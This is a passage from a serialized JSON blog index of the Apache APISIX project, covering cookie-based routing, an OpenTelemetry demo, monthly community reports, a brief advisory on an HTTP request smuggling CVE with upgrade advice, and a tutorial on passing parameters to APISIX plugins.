[lua-resty-expr](https://github.com/api7/lua-resty-expr) for more details.\\n>\\n>-- [Route API](https://apisix.apache.org/docs/apisix/admin-api/#request-body-parameters)\\n\\nOne can only understand `vars` in the Router Radix Tree documentation. The Router Radix Tree powers the Apache APISIX\'s matching engine.\\n\\n>Nginx provides a variety of built-in variables that can be used to filter routes based on certain criteria. Here is an example of how to filter routes by Nginx built-in variables:\\n>\\n>-- [How to filter route by Nginx built-in variable?](https://apisix.apache.org/docs/apisix/router-radixtree/#how-to-filter-route-by-nginx-built-in-variable)\\n>\\n>```bash\\n>$ curl http://127.0.0.1:9180/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -i -d \'\\n>{\\n>    \\"uri\\": \\"/index.html\\",\\n>    \\"vars\\": [\\n>        [\\"http_host\\", \\"==\\", \\"iresty.com\\"],\\n>        [\\"cookie_device_id\\", \\"==\\", \\"a66f0cdc4ba2df8c096f74c9110163a9\\"],\\n>        [\\"arg_name\\", \\"==\\", \\"json\\"],\\n>        [\\"arg_age\\", \\">\\", \\"18\\"],\\n>        [\\"arg_address\\", \\"~~\\", \\"China.*\\"]\\n>    ],\\n>    \\"upstream\\": {\\n>        \\"type\\": \\"roundrobin\\",\\n>        \\"nodes\\": {\\n>            \\"127.0.0.1:1980\\": 1\\n>        }\\n>    }\\n>}\'\\n>```\\n>\\n>This route will require the request header `host` equal `iresty.com`, request cookie key `_device_id` equal `a66f0cdc4ba2df8c096f74c9110163a9`, etc.  You can learn more at [radixtree-new](https://github.com/api7/lua-resty-radixtree#new).\\n\\nAmong all Nginx variables, we can find `$cookie_xxx`. Hence, we can come up with the following configuration:\\n\\n```yaml\\nroutes:\\n  - name: Check for French cookie\\n    uri: /\\n    vars: [[ \\"cookie_site\\", \\"==\\", \\"fr\\" ]]             #1\\n    upstream_id: 1\\n  - name: Check for English cookie\\n    uri: /\\n    vars: [[ \\"cookie_site\\", \\"==\\", \\"en\\" ]]             #2\\n    upstream_id: 2\\n```\\n\\n1. Match if a cookie named `site` has value `fr`\\n2. Match if a cookie named `site` has value `en`\\n\\nWe need to configure the final route, the one used when no cookie is set. We use the `traffic-split` plugin to assign a route randomly.\\n\\n>The `traffic-split` Plugin can be used to dynamically direct portions of traffic to various Upstream services.\\n>\\n>This is done by configuring `match`, which are custom rules for splitting traffic, and `weighted_upstreams` which is a set of Upstreams to direct traffic to.\\n>\\n>When a request is matched based on the `match` attribute configuration, it will be directed to the Upstreams based on their configured `weights`. You can also omit using the `match` attribute and direct all traffic based on `weighted_upstreams`.\\n>\\n>-- [traffic-split](https://apisix.apache.org/docs/apisix/plugins/traffic-split/)\\n\\nThe third route is the following:\\n\\n```yaml\\n  - name: Let the fate decide\\n    uri: /\\n    upstream_id: 1                                    #1\\n    plugins:\\n      traffic-split:\\n        rules:\\n          - weighted_upstreams:\\n              - weight: 50                            #1\\n              - upstream_id: 2                        #2\\n                weight: 50                            #2\\n```\\n\\n1. The weight of the upstream `1` is `50`\\n2. The upstream `2` weight is also `50` out of the total weight sum. It\'s a half-half chance of APISIX forwarding it to either upstream\\n\\nAt this point, we need to solve one remaining issue: the order in which APISIX will evaluate the routes. When routes\' paths are disjoint, the order plays no role; when they are overlapping, it does.\\n\\nFor example, if APISIX evaluates the last route first, it will forward the request to a random upstream, even though a cookie might have been set. We need to force the evaluation of the first two routes first. For that, APISIX offers the `priority` parameter; its value is `0` by default. It evaluates routes matching by order of decreasing priority. We need to override it to evaluate the random route last.\\n\\n```yaml\\n  - name: Let the fate decide\\n    uri: /\\n    upstream_id: 1\\n    priority: -1\\n#...\\n```\\n\\nYou can try the setup in a browser or with `curl`. With curl, we can set the \\"first\\" request like this:\\n\\n```bash\\ncurl -v localhost:9080\\n```\\n\\nIf the upstream sets the cookie correctly, you should see the following line among the different response headers:\\n\\n```\\nSet-Cookie: site=fr\\n```\\n\\nSince curl doesn\'t store cookies by default, the value should change across several calls. If we set the cookie, the value stays constant:\\n\\n```bash\\ncurl -v --cookie \'site=en\' localhost:9080                  #1\\n```\\n\\n1. The cookie name is case-sensitive; beware\\n\\nThe browser keeps the cookie, so it\'s even simpler. Just go to <http:localhost:9080> and refresh several times: the content is the same as well. The content will change if you change the cookie to another possible value and request again.\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/ajavageek/fixed-route-apisix).\\n\\n**To go further:**\\n\\n* [Setting cookie based on a condition](https://github.com/apache/apisix/issues/11279)\\n* [router-radixtree](https://apisix.apache.org/docs/apisix/router-radixtree/)\\n* [Route Admin API](https://apisix.apache.org/docs/apisix/admin-api/#route-api)"},{"id":"Even more OpenTelemetry!","metadata":{"permalink":"/blog/2024/06/06/even-more-opentelemetry","source":"@site/blog/2024/06/06/even-more-opentelemetry.md","title":"Even more OpenTelemetry!","description":"I continue to work on my Opentelemetry demo. Its main idea is to showcase _traces_ across various technology stacks, including asynchronous communication via an MQTT queue. This week, I added a couple of components and changed the architecture. Here are some noteworthy learnings; note that some of them might not be entirely connected to OpenTelemetry.\\n","date":"2024-06-06T00:00:00.000Z","formattedDate":"June 6, 2024","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.22,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Random and fixed routes with Apache APISIX","permalink":"/blog/2024/06/13/fixed-routes-apisix"},"nextItem":{"title":"Monthly Report (May 01 - May 31)","permalink":"/blog/2024/05/31/monthly-report"}},"content":"<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/even-more-opentelemetry/\\" />\\n</head>\\n\\n>I continue to work on my [Opentelemetry demo](https://github.com/nfrankel/opentelemetry-tracing). Its main idea is to showcase _traces_ across various technology stacks, including asynchronous communication via an MQTT queue. This week, I added a couple of components and changed the architecture. Here are some noteworthy learnings; note that some of them might not be entirely connected to OpenTelemetry.\\n\\n\x3c!--truncate--\x3e\\n\\nHere\'s an updated diagram. New components appear in violet, and updated components appear in green.\\n\\n![OpenTelemetry demo overall component diagram](https://static.apiseven.com/uploads/2024/05/29/Hn3uRxIn_otel-component-model.png)\\n\\nI want to be able to add more components. Thus, I decided that instead of directly querying the database, the `inventory` component would query warehouses, which are supposed to be located in different regions. Each warehouse can be implemented in a different stack, and you can have as many as you want\u2014PRs are welcome. I miss Elixir and .Net at the moment. The contract, which I need to write down, is easy:\\n\\n* An endpoint `/stocks/${productId}`\\n* The ability to query PostgreSQL\\n* Return the stock in the form:\\n\\n    ![Stock transfer object](https://static.apiseven.com/uploads/2024/05/29/KIdPCmzm_stock-class-model.png)\\n\\nI\'ve written about the changes in the inventory to account for the new configuration. Let\'s talk about the warehouse components.\\n\\n## The Go warehouse\\n\\nLet me be blunt: I dislike (hate?) Go for its error handling approach. However, with close to zero knowledge of the language, I was able to build a basic HTTP API that reads from the database in a couple of hours. I chose [Gin Gonic](https://gin-gonic.com/) for the web library and [Gorm](https://gorm.io/index.html) for the <abbr title=\\"Object Relational Mapper\\">ORM</abbr>. OpenTelemetry provides an integration with a [couple of libraries](https://github.com/open-telemetry/opentelemetry-go-contrib/tree/main/instrumentation#instrumentation-packages), including Gin and Gorm. On the Dockerfile side, it\'s also pretty straightforward. I skipped optimizing the mount cache and the final base image, though I might return to it later.\\n\\nAll in all, that\'s the component I developed the fastest. I still dislike the Go language, but I begrudgingly understand that developers who want to get things done use it.\\n\\n## The Ruby warehouse\\n\\nWhile Ruby is not this famous anymore, I still wanted the stack in my architecture. I eschewed Ruby on Rails in favor of the leaner [Sinatra](https://sinatrarb.com/) framework. I use [sequel](https://sequel.jeremyevans.net/) for database access. The dynamic nature of the language was a bit of a hurdle, which is why it took me more time to develop my service than with Go.\\n\\nI also spent a non-trivial amount of time on auto-instrumentation. For stacks with a runtime, auto-instrumentation allows developers to go on their merry way, oblivious to any OpenTelemetry concern. At runtime, the Ops team adds the necessary configuration for OpenTelemetry. For example, we achieve this with a Java Agent on the JVM.\\n\\nI expected the same \\"carefree\\" approach with Ruby, but I couldn\'t find anything related to the stack. Ruby on Rails has a built-in plugin system, but not Sinatra. I tried to use `bash` to glue files together, but to no avail. If you\'re a Ruby expert or have any experience doing this, please let me know how.\\n\\n## The GraalVM native warehouse\\n\\nThis one is a regular Kotlin application on Spring Boot with a twist: I\'m using [GraalVM native image](https://www.graalvm.org/latest/reference-manual/native-image/) to compile ahead-of-time to _bytecode_. This way, I can use a tiny Docker image as my base, _e.g_, `busybox`. It\'s not as efficient as Go or Rust, but it\'s a good bet if tied to the JVM.\\n\\nOpenTelemetry did work on the JVM version but didn\'t when I compiled it to _bytecode_. Given the compilation time, it took me a couple of days of back-and-forth to make it work. The reason is simple: Spring Boot relies on _auto configuration_ classes to activate or not features. Some auto-configuration classes rely on the presence of classes, others on the presence of beans, others on the opposite, others on existing properties, others on a combination of the above, etc.\\n\\nIn my case, the guilty class was `OtlpTracingConfigurations.ConnectionDetails`. It relies on the `management.otlp.tracing.endpoint` property:\\n\\n```java\\nclass OtlpTracingConfigurations {\\n\\n  @Configuration(proxyBeanMethods = false)\\n  static class ConnectionDetails {\\n\\n    @Bean\\n    @ConditionalOnMissingBean\\n    @ConditionalOnProperty(prefix = \\"management.otlp.tracing\\", name = \\"endpoint\\")\\n    OtlpTracingConnectionDetails otlpTracingConnectionDetails(OtlpProperties properties) {\\n      return new PropertiesOtlpTracingConnectionDetails(properties);\\n    }\\n}\\n```\\n\\nIf the property is not present **at compile-time**, the Spring Framework doesn\'t create a bean of type `OtlpTracingConnectionDetails`. Through a chain of missing beans, the final binary doesn\'t contain OpenTelemetry-related code. The solution is easy: set the property to an empty string in the `application.properties` file, and override it to its regular value in the Docker Compose file.\\n\\nWhile auto-configuration is a compelling feature, you must understand how it works. That\'s the easy part. However, it\'s much more work to understand the whole chain of auto-configuration activation regarding a feature. Having distanced myself from the JVM, I\'m no longer an expert in these chains, much less the OpenTelemetry one. I finally understand why some developers avoid Spring Boot and name it magic.\\n\\n## Migrating from JavaScript to TypeScript\\n\\nI used JavaScript in my first draft of a subscriber to the MQTT queue. Soon afterward, I decided to migrate to TypeScript. JavaScript code is valid TypeScript, so a simple copy-paste worked, with the addition of `@ts-ignore`.\\n\\nHowever, when I tried to fix the code to \\"true\\" TypeScript, I couldn\'t see any OpenTelemetry trace. As for GraalVM, I went back and forth several times, but this time, I decided to solve it once and for all. I migrated code line by line until I isolated the issue in the following snippet:\\n\\n```javascript\\nconst userProperties = {}\\n\\nif (packet.properties && packet.properties[\'userProperties\']) {\\n    const props = packet.properties[\'userProperties\']\\n    console.error(\'Props\', props)\\n    for (const key of Object.keys(props)) {\\n        userProperties[key] = props[key]                         //1\\n    }\\n}\\n```\\n\\n1. The TypeScript compiler complains with the following error message: `TS7053: Element implicitly has an any type because expression of type string can\'t be used to index type {}`\\n\\nI earlier tried to fix it with the following:\\n\\n```typescript\\nconst userProperties = new Map<string, any>()\\n```\\n\\nIt compiled, but my limited understanding of JavaScript prevented me from realizing that a `Map` is not the same structure as an object. I understood the issue only when I isolated the exact line that went wrong. I just had to find the correct syntax to declare the type of an object:\\n\\n```typescript\\nconst userProperties: Record<string, any> = {}\\n```\\n\\n## Adding a Redis cache\\n\\nSo far, my services have used only PostgreSQL as a data store. Datastores don\'t implement OpenTelemetry by themselves, but the correct instrumentation of an app can show the trace going to the datastore. Here, you can see the trace created by the OpenTelemetry agent on a Kotlin/Spring Boot app that uses the PostgreSQL driver.\\n\\n![Postgres trace](https://static.apiseven.com/uploads/2024/05/29/01FQLCb7_postgres-gorm-trace.webp)\\n\\nHere\'s the one from the Gorm framework, instrumented manually.\\n\\n![Gorm trace](https://static.apiseven.com/uploads/2024/05/29/01FQLCb7_postgres-gorm-trace.webp)\\n\\nBoth traces display the system, the statement, and a couple of other data. The Redis instrumentation shows the same information under the same structure!\\n\\n![Redis trace via Lettuce](https://static.apiseven.com/uploads/2024/05/29/GHKyIB8p_redis-lettuce-trace.webp)\\n\\nIcing on the cake, if you use the Lettuce client, which is the default for Spring, you don\'t need additional changes. The OpenTelemetry agent already takes care of everything.\\n\\n## Another Apache APISIX instance\\n\\nLast but not least, I\'ve added another APISIX instance. Most organizations manage their APIs from behind a single multi-node API Gateway. However, it can be a significant burden depending on how the organization structures the teams. When a team needs to deploy a new or change the routing of an existing non-front-facing API, they want the change ASAP. If the team in charge of the centralized API Gateway doesn\'t respond to tickets, it slows down the API team and the business value they want to deploy.\\n\\nFor this reason, it\'s a perfectly valid pattern to set up API Gateways that are not front-facing under the responsibility of each API team - or business department. The granularity here depends on what works for each organization. It reduces friction when the infrastructure needs to change but does so at the cost of more diversified work for the API team. It also allows for different API Gateway technology (or technologies) from the front-facing one.\\n\\nIn my demo, I assume the team responsible for the `inventory` component has set up such an instance. It handles all routing to the warehouses. All other components still rely on the primary APISIX instance.\\n\\n## Conclusion\\n\\nIn this post, I\'ve described several changes I made in my OpenTelemetry tracing demo and the lessons I learned. I want to add additional warehouse components in other stacks. What stack would you be interested in? Would you like to contribute to such a component?\\n\\n**To go further:**\\n\\n* [End-to-end tracing with OpenTelemetry](https://blog.frankel.ch/end-to-end-tracing-opentelemetry/)\\n* [Improving upon my OpenTelemetry Tracing demo](https://blog.frankel.ch/improve-otel-demo/)\\n* [Parsing structured environment variables in Rust](https://blog.frankel.ch/structured-env-vars-rust/)\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/nfrankel/opentelemetry-tracing)."},{"id":"Monthly Report (May 01 - May 31)","metadata":{"permalink":"/blog/2024/05/31/monthly-report","source":"@site/blog/2024/05/31/monthly-report.md","title":"Monthly Report (May 01 - May 31)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2024-05-31T00:00:00.000Z","formattedDate":"May 31, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.07,"truncated":true,"authors":[],"prevItem":{"title":"Even more OpenTelemetry!","permalink":"/blog/2024/06/06/even-more-opentelemetry"},"nextItem":{"title":"HTTP Request Smuggling in forward-auth Plugin (CVE-2024-32638)","permalink":"/blog/2024/05/02/cve-2024-32638"}},"content":"> We have recently made some additions and improvements to specific features within Apache APISIX. These include supporting the hcv namespace in HashiCorp Vault and allowing setting headers in introspection requests. For detailed information, please read the monthly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom May 1 to May 31, a total of 7 contributors made 9 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2024/06/04/nPBI02x2_may-contributors-list.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2024/05/31/paTYXQAh_new-contributors-may.png)\\n\\n## Recent Feature Highlights\\n\\n- [Support hcv namespace in HashiCorp Vault](https://github.com/apache/apisix/pull/11277)\uff08Contributor: [bzp2010](https://github.com/bzp2010))\\n\\n- [Allow setting headers in introspection request](https://github.com/apache/apisix/pull/11090)\uff08Contributor: [yuweizzz](https://github.com/yuweizzz))\\n\\n## Recent Blog Recommendations\\n\\n- [Five Ways to Pass Parameters to Apache APISIX](https://apisix.apache.org/blog/2024/05/02/pass-parameters-apisix/)\\n\\nThe official website and GitHub Issues of Apache APISIX provide a wealth of documentation of tutorials and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences."},{"id":"HTTP Request Smuggling in forward-auth Plugin (CVE-2024-32638)","metadata":{"permalink":"/blog/2024/05/02/cve-2024-32638","source":"@site/blog/2024/05/02/cve-2024-32638.md","title":"HTTP Request Smuggling in forward-auth Plugin (CVE-2024-32638)","description":"Enabling the `forward-auth` plugin allows Apache APISIX to trigger illegal requests (HTTP Request Smuggling), resulting in a security vulnerability.","date":"2024-05-02T00:00:00.000Z","formattedDate":"May 2, 2024","tags":[{"label":"Vulnerabilities","permalink":"/blog/tags/vulnerabilities"}],"readingTime":0.62,"truncated":true,"authors":[],"prevItem":{"title":"Monthly Report (May 01 - May 31)","permalink":"/blog/2024/05/31/monthly-report"},"nextItem":{"title":"Five ways to pass parameters to Apache APISIX","permalink":"/blog/2024/05/02/pass-parameters-apisix"}},"content":"> For APISIX versions 3.8.0 and 3.9.0, enabling the forward-auth plugin allows APISIX to trigger illegal requests (HTTP Request Smuggling).\\n\x3c!--truncate--\x3e\\n\\n## Problem Description\\n\\nEnabling the `forward-auth` plugin allows Apache APISIX to trigger illegal requests (HTTP Request Smuggling), resulting in a security vulnerability.\\n\\n## Affected Versions\\n\\nThis issue affects Apache APISIX versions: 3.8.0 and 3.9.0.\\n\\n## Solution\\n\\nFor Apache APISIX users using versions 3.8.0 and 3.9.0, it is recommended to upgrade to versions 3.8.1, 3.9.1, or higher, in which the issue is fixed.\\n\\n## Vulnerability details\\n\\nSeverity: Low\\n\\nVulnerability public date: May 2, 2024\\n\\nCVE details: https://nvd.nist.gov/vuln/detail/CVE-2024-32638\\n\\n## Contributor Profile\\n\\nThis vulnerability was discovered and reported by Brandon Arp and Bruno Green from Topsort. Thank you for your contribution to the Apache APISIX community."},{"id":"Five ways to pass parameters to Apache APISIX","metadata":{"permalink":"/blog/2024/05/02/pass-parameters-apisix","source":"@site/blog/2024/05/02/pass-parameters-apisix.md","title":"Five ways to pass parameters to Apache APISIX","description":"I recently read 6 Ways To Pass Parameters to Spring REST API. Though the title is a bit misleading, as it\'s unrelated to REST, it does an excellent job listing all ways to send parameters to a Spring application. I want to do the same for Apache APISIX; it\'s beneficial when you write a custom plugin.\\n","date":"2024-05-02T00:00:00.000Z","formattedDate":"May 2, 2024","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.385,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"HTTP Request Smuggling in forward-auth Plugin (CVE-2024-32638)","permalink":"/blog/2024/05/02/cve-2024-32638"},"nextItem":{"title":"Monthly Report (April 01 - April 30)","permalink":"/blog/2024/04/30/monthly-report"}},"content":"<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/pass-parameters-apisix/\\" />\\n</head>\\n\\n>I recently read [6 Ways To Pass Parameters to Spring REST API](https://javabulletin.substack.com/p/6-ways-to-pass-parameters-to-spring). Though the title is a bit misleading, as it\'s unrelated to REST, it does an excellent job listing all ways to send parameters to a Spring application. I want to do the same for Apache APISIX; it\'s beneficial when you write a custom plugin.\\n\\n\x3c!--truncate--\x3e\\n\\n## General setup\\n\\nThe general setup uses Docker Compose and static configuration.\\nI\'ll have one plugin per way to pass parameters.\\n\\n```yaml\\nservices:\\n  httpbin:\\n    image: kennethreitz/httpbin                                         #1\\n  apisix:\\n    image: apache/apisix:3.9.0-debian\\n    volumes:\\n      - ./apisix/conf/config.yml:/usr/local/apisix/conf/config.yaml:ro\\n      - ./apisix/conf/apisix.yml:/usr/local/apisix/conf/apisix.yaml:ro  #2\\n      - ./apisix/plugins:/opt/apisix/plugins:ro                         #3\\n    ports:\\n      - \\"9080:9080\\"\\n```\\n\\n1. Local httpbin for more reliable results and less outbound network traffic\\n2. Static configuration file\\n3. Plugins folder, one file per plugin\\n\\n```yaml\\ndeployment:\\n  role: data_plane\\n  role_data_plane:\\n    config_provider: yaml                                              #1\\napisix:\\n  extra_lua_path: /opt/?.lua                                           #2\\nplugins:\\n  - proxy-rewrite                                                      #3\\n  - path-variables                                                     #4\\n# ...  \\n```\\n\\n1. Set static configuration\\n2. Use every Lua file under `/opt/apisix/plugins` as a plugin\\n3. Regular plugin\\n4. Custom plugin, one per alternative\\n\\n## Path variables\\n\\nPath variables are a straightforward way to pass data. Their main issue is that they are limited to simple values, _e.g._, `/links/{n}/{offset}`. The naive approach is to write the following Lua code:\\n\\n```lua\\nlocal core = require(\\"apisix.core\\")\\n\\nfunction _M.access(_, ctx)\\n    local captures, _ = ngx.re.match(ctx.var.uri, \'/path/(.*)/(.*)\')  --1-2\\n    for k, v in pairs(captures) do\\n        core.log.warn(\'Order-Value pair: \', k, \'=\', v)\\n    end\\nend\\n```\\n\\n1. APISIX stores the URI in `ctx.var.uri`\\n2. Nginx offers a regular expression API\\n\\nLet\'s try:\\n\\n```bash\\ncurl localhost:9080/path/15/3\\n```\\n\\nThe log displays:\\n\\n```\\nOrder-Value pair: 0=/path/15/3\\nOrder-Value pair: 1=15\\nOrder-Value pair: 2=3\\n```\\n\\nI didn\'t manage errors, though. Alternatively, we can rely on Apache APISIX features: a specific [router](https://apisix.apache.org/docs/apisix/terminology/router/). The default router, `radixtree_host_uri`, uses both the host and the URI to match requests. `radixtree_uri_with_parameter` lets go of the host part but also matches parameters.\\n\\n```yaml\\napisix:\\n  extra_lua_path: /opt/?.lua\\n  router:\\n    http: radixtree_uri_with_parameter\\n```\\n\\nWe need to update the route:\\n\\n```yaml\\nroutes:\\n  - path-variables\\n  - uri: /path/:n/:offset                                              #1\\n    upstream_id: 1\\n    plugins:\\n      path-variables: ~\\n```\\n\\n1. Store `n` and `offset` in the context, under `ctx.curr_req_matched`\\n\\nWe keep the plugin just to log the path variables:\\n\\n```lua\\nfunction _M.access(_, ctx)\\n    core.log.warn(\'n: \', ctx.curr_req_matched.n, \', offset: \', ctx.curr_req_matched.offset)\\nend\\n```\\n\\nThe result is as expected with the same request as above:\\n\\n```\\nn: 15, offset: 3\\n```\\n\\n## Query parameters\\n\\nQuery parameters are another regular way to pass data. Like path variables, you can only pass simple values, _e.g._, `/?foo=bar`. The Lua code doesn\'t require regular expressions:\\n\\n```lua\\nlocal core = require(\\"apisix.core\\")\\n\\nfunction _M.access(_, _)\\n    local args, _ = ngx.req.get_uri_args()\\n    for k, v in pairs(args) do\\n        core.log.warn(\'Order-Value pair: \', k, \'=\', v)\\n    end\\nend\\n```\\n\\nLet\'s try:\\n\\n```bash\\ncurl localhost:9080/query\\\\?foo=one\\\\&bar=three\\n```\\n\\nThe log displays:\\n\\n```\\nKey-Value pair: bar=three\\nKey-Value pair: foo=one\\n```\\n\\nRemember that query parameters have no order.\\n\\nOur code contains an issue, though. The `ngx.req.get_uri_args()` accepts [parameters](https://github.com/openresty/lua-nginx-module/#ngxreqget_uri_args). Remember that the client can pass a query parameter multiple times with different values, _e.g._, `?foo=one&foo=two`? The first parameter is the maximum number of values returned for a single query parameter. To avoid ignoring value, we should set it to 0, _i.e._, unbounded.\\n\\nSince every plugin designer must remember it, we can add the result to the context for other plugins down the chain. The updated code looks like this:\\n\\n```lua\\nlocal core = require(\\"apisix.core\\")\\n\\nfunction _M.get_uri_args(ctx)\\n    if not ctx then\\n        ctx = ngx.ctx.api_ctx\\n    end\\n    if not ctx.req_uri_args then\\n        local args, _ = ngx.req.get_uri_args(0)\\n        ctx.req_uri_args = args\\n    end\\n    return ctx.req_uri_args\\nend\\n\\nfunction _M.access(_, ctx)\\n    for k, v in pairs(ctx.req_uri_args) do\\n        core.log.warn(\'Key-Value pair: \', k, \'=\', v)\\n    end\\nend\\n```\\n\\n## Request headers\\n\\nRequest headers are another way to pass parameters. While they generally only contain simple values, you can also use them to send structured values, _e.g._, JSON. Depending on your requirement, APISIX can list all request headers or a specific one. Here, I get all of them:\\n\\n```lua\\nlocal core = require(\\"apisix.core\\")\\n\\nfunction _M.access(_, _)\\n    local headers = core.request.headers()\\n    for k, v in pairs(headers) do\\n        core.log.warn(\'Key-Value pair: \', k, \'=\', v)\\n    end\\nend\\n```\\n\\nWe test with a simple request:\\n\\n```bash\\ncurl -H \'foo: 1\' -H \'bar: two\'  localhost:9080/headers\\n```\\n\\nAnd we got more than we expected because curl added default headers:\\n\\n```\\nKey-Value pair: user-agent=curl/8.4.0\\nKey-Value pair: bar=two\\nKey-Value pair: foo=1\\nKey-Value pair: host=localhost:9080\\nKey-Value pair: accept=*/*\\n```\\n\\n## Request body\\n\\nSetting a request body is the usual way to send structured data, _e.g_, JSON. Nginx offers a simple API to collect such data.\\n\\n```lua\\nlocal core = require(\\"apisix.core\\")\\n\\nfunction _M.access(_, _)\\n    local args = core.request.get_post_args()                          --1\\n    local body = next(args, nil)                                       --2\\n    core.log.warn(\'Body: \', body)\\nend\\n```\\n\\n1. Access the body as a regular Lua table\\n2. A table is necessary in case of multipart payloads, _e.g._, file uploads. Here, we assume there\'s a single arg, the content body.\\n\\nIt\'s time to test:\\n\\n```bash\\ncurl  localhost:9080/body -X POST -d \'{ \\"foo\\": 1, \\"bar\\": { \\"baz\\": \\"two\\" } }\'\\n```\\n\\nThe result is as expected:\\n\\n```\\nBody: { \\"foo\\": 1, \\"bar\\": { \\"baz\\": \\"two\\" } }\\n```\\n\\n## Cookies\\n\\nLast but not least, we can send parameters via cookies. The difference with previous alternatives is that cookies persist on the client side, and the browser sends them with each request. On the Lua side, we need to know the cookie name instead of listing all query parameters or headers.\\n\\n```lua\\nlocal core = require(\\"apisix.core\\")\\n\\nfunction _M.access(_, ctx)\\n    local foo = ctx.var.cookie_foo                                     --1\\n    core.log.warn(\'Cookie value: \', foo)\\nend\\n```\\n\\n1. The cookie is named `foo` and is case-insensitive\\n\\nLet\'s test:\\n\\n```bash\\ncurl --cookie \\"foo=Bar\\"  localhost:9080/cookies\\n```\\n\\nThe result is correct:\\n\\n```\\nCookie value: Bar\\n```\\n\\n## Summary\\n\\nIn this post, we listed five alternatives to pass parameters server-side and explained how to access them on Apache APISIX. Here\'s the API summary:\\n\\n| Alternative | Source | API |\\n| ---         | ---    | --- |\\n| Path variable | APISIX Router | Use the `radixtree_uri_with_parameter` router |\\n| Query parameter | Nginx | `ngx.req.get_uri_args(0)` |\\n| Request header | APISIX core lib | `core.request.headers()` |\\n| Request body | APISIX core lib | `core.request.get_post_args()` |\\n| Cookie | Method context parameter | `ctx.var.cookie_<name>` |\\n\\nThanks a lot to [Zeping Bai](https://github.com/bzp2010) for his review and explanations.\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/ajavageek/apisix-pass-parameters).\\n\\n**To go further:**\\n\\n* [6 Ways To Pass Parameters to Spring REST API](https://javabulletin.substack.com/p/6-ways-to-pass-parameters-to-spring)\\n* [How to Build an Apache APISIX Plugin From 0 to 1?](https://api7.ai/blog/how-to-build-an-apache-apisix-plugin-from-0-to-1)"},{"id":"Monthly Report (April 01 - April 30)","metadata":{"permalink":"/blog/2024/04/30/monthly-report","source":"@site/blog/2024/04/30/monthly-report.md","title":"Monthly Report (April 01 - April 30)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2024-04-30T00:00:00.000Z","formattedDate":"April 30, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.27,"truncated":true,"authors":[],"prevItem":{"title":"Five ways to pass parameters to Apache APISIX","permalink":"/blog/2024/05/02/pass-parameters-apisix"},"nextItem":{"title":"Release Apache APISIX 3.8.1","permalink":"/blog/2024/04/29/release-apache-apisix-3.8.1"}},"content":"> We have recently made some additions and improvements to specific features within Apache APISIX. These include adding discovery k8s dump data interface, adding max req/resp body size attributes (`max_resp_body_bytes` and `max_req_body_bytes`) in the `kafka-logger` plugin, and autogenerating the admin API key if they are not configured in the configuration file. For detailed information, please read the monthly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom 04.01 to 04.30, a total of 16 contributors made 43 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2024/04/30/txD3ooma_contributor-listi-apr.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2024/04/30/b01wMlfs_new-contributors-apr.png)\\n\\n## Recent Feature Highlights\\n\\n- [Add discovery k8s dump data interface](https://github.com/apache/apisix/pull/11111)\uff08Contributor: [hanqingwu](https://github.com/hanqingwu))\\n\\n- [Add max req/resp body size attributes (`max_resp_body_bytes` and `max_req_body_bytes`) in the `kafka-logger` plugin](https://github.com/apache/apisix/pull/11133)\uff08Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\n- [Autogenerate the admin API key if not configured in the configuration file](https://github.com/apache/apisix/pull/11080)\uff08Contributor: [Revolyssup](https://github.com/Revolyssup))\\n\\n## Recent Blog Recommendations\\n\\n- [Release Apache APISIX 3.8.1](https://apisix.apache.org/blog/2024/04/29/release-apache-apisix-3.8.1/)\\n\\n- [Release Apache APISIX 3.9.1](https://apisix.apache.org/blog/2024/04/29/release-apache-apisix-3.9.1/)\\n\\nThe official website and GitHub Issues of Apache APISIX provide a wealth of documentation of tutorials and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences."},{"id":"Release Apache APISIX 3.8.1","metadata":{"permalink":"/blog/2024/04/29/release-apache-apisix-3.8.1","source":"@site/blog/2024/04/29/release-apache-apisix-3.8.1.md","title":"Release Apache APISIX 